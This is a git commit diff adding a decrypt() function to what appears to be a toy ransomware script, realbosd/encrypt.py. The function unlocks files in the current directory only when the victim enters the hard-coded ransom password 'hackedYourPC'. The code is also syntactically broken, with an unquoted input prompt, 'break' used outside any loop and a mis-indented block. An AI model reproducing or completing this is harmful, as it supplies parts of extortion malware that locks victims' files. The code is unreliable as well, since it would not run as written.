cbd39ca73a57e812d009de3c5e0307500e18346f
Shadow <shadows.mail@icloud.com>
2026-05-21 11:06:00 +0200

    Add decrypt function to handle file decryption

--- realbosd/encrypt.py
+++ realbosd/encrypt.py
@@ -27,5 +27,35 @@ def encrypt():
         except Exception:
             continue
 
+def decrypt():
+    userpasswd = input(Enter password to decrypt your files: )
+    if userpasswd != "hackedYourPC":
+        break
+    try:
+        with open("key.key", "rb") as k:
+            key = k.read()
+    except Exception:
+        break
+    cipher = Fernet(key)
+
+    cwd = os.getcwd()
+
+    files = []
+
+    items = os.listdir(cwd)
+    for file in items:
+        if os.path.isfile(file) and file != "key.key":
+            files.append(file)
+
+    for item in files:
+        with open(item, "rb") as i:
+            encryptedContent = i.read()
+        try:
+            with open(item, "wb") as e:
+            decryptedContent = cipher.decrypt(encryptedContent)
+            e.write(decryptedContent)
+        except Exception:
+            continue
+
 if __name__ == "__main__":
-    encrypt()
+    break
